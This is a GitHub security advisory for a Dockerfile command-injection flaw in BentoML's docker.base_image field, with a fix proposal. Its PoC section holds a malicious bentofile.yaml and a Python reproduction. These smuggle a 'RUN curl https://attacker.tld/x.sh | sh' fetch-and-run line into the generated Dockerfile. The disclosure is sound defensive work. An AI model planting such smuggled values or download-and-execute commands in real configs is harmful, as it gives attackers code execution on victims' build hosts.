# [H] BentoML Dockerfile command injection via docker.base_image (sister of pending GHSA-w2pm-x38x-jp44 / CVE-2026-33744 / CVE-2026-35043)

## Summary
Severity: High
Advisory: GHSA-78f9-r8mh-4xm2
CVE: CVE-2026-44345
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-78f9-r8mh-4xm2
Type: github-advisory

## Affected
- PyPI: `bentoml` — affected >=0 <1.4.39

## Details
The same Dockerfile template that mishandles `envs[*].name` (pending GHSA-w2pm-x38x-jp44) also interpolates `docker.base_image` raw with no escaping, newline filtering, or validation. A malicious bento.yaml with a multi-line `docker.base_image` value smuggles arbitrary Dockerfile directives into the generated Dockerfile, and `bentoml containerize` then runs `docker build` which executes the injected `RUN` directives on the victim host.

## Vulnerable code

`src/bentoml/_internal/container/frontend/dockerfile/templates/base_v2.j2:38` (current main, 2026-04-28):

```jinja
FROM {{ __options__base_image }} AS base-container
```

`__options__base_image` resolves to `DockerOptions.base_image` (`src/bentoml/_internal/bento/build_config.py:176`):

```python
base_image: t.Optional[str] = None
```

No `validator`, no `converter`, no newline check. The value is loaded straight from `bento.yaml` in `src/bentoml/_internal/container/__init__.py:206` via `DockerOptions(**docker_attrs)` and rendered as-is.

## PoC

Malicious `bentofile.yaml`:

```yaml
docker:
  base_image: |
    python:3.10
    RUN curl https://attacker.tld/x.sh | sh
    FROM scratch
```

Minimal reproduction of the unsafe interpolation:

```python
from jinja2 import Environment
env = Environment()
malicious = 'python:3.10\nRUN curl https://attacker.tld/x.sh | sh\nFROM scratch'
out = env.from_string('FROM {{ __options__base_image }} AS base-container').render(__options__base_image=malicious)
print(out)
```

Output:

```
FROM python:3.10
RUN curl https://attacker.tld/x.sh | sh
FROM scratch AS base-container
```

Three valid Dockerfile directives instead of one. The `RUN curl` executes during `docker build`. The trailing `FROM scratch AS base-container` provides the named build stage the rest of the template depends on, so the build proceeds without error.

## Impact

Identical to GHSA-w2pm-x38x-jp44: arbitrary command execution on the victim's host during `bentoml containerize` of an attacker-supplied bento. Threat model is bento sharing (registry, marketplace, supply-chain handoff). The victim expects `docker.base_image` to be a Docker image reference, not a Dockerfile fragment.

## Suggested fix

Validate `DockerOptions.base_image` at the config layer: reject any value containing newline characters (`\n`, `\r`) or whitespace beyond a single space-separated tag. A regex like `^[A-Za-z0-9._/-]+(:[A-Za-z0-9._-]+)?(@sha256:[a-f0-9]{64})?$` covers the practical Docker reference format.

The same hardening should be extended to other unvalidated fields interpolated raw in `base_v2.j2`:

* `__options__build_include[*]` at line 97 (`COPY ... ./src/{{ name }} ./src/{{ name }}`) — same newline-injection class for path entries from `Image.build_include(*file_paths)`.
* `bento__user`, `bento__uid_gid`, `bento__path`, `bento__home`, `bento__entrypoint` — currently sourced from server-side defaults but should be defended in depth if they ever become user-overridable through `override_bento_env`.

## References

* Pending sibling: GHSA-w2pm-x38x-jp44 (envs[*].name), itself a sibling-fix-bypass of CVE-2026-33744 / CVE-2026-35043.
* CWE-78: https://cwe.mitre.org/data/definitions/78.html

## References
- https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2
- https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44
- https://nvd.nist.gov/vuln/detail/CVE-2026-44345
- https://github.com/bentoml/BentoML
- https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-189.yaml
